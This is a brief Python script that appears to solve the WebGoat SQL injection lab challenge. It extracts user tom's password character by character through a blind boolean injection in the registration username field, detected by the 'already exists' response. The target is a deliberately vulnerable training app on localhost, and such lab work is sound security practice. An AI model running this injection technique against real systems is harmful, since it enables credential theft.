import requests

url = "http://localhost:8080/WebGoat/SqlInjection/challenge"
cookie = {"JSESSIONID" : "D05538E0ECDEBA53D2BE4C371DB262E6"}
alphabet = "abcdefghijklmnopqrstuvwyz"
tom_pass = ''

for i in range(1,24):
	for j in alphabet:
		r = requests.put(url,cookies = cookie, data ={"username_reg":"tom' and substring(password,{},1)='{}".format(i,j),
		 "email_reg":"bao@gmail.com", "password_reg":'1',"check_password_reg":'1',"register-submit":"Register Now"})
		if(b"already exists" in r.content):
			tom_pass += j
			print("[+]" + tom_pass)
			

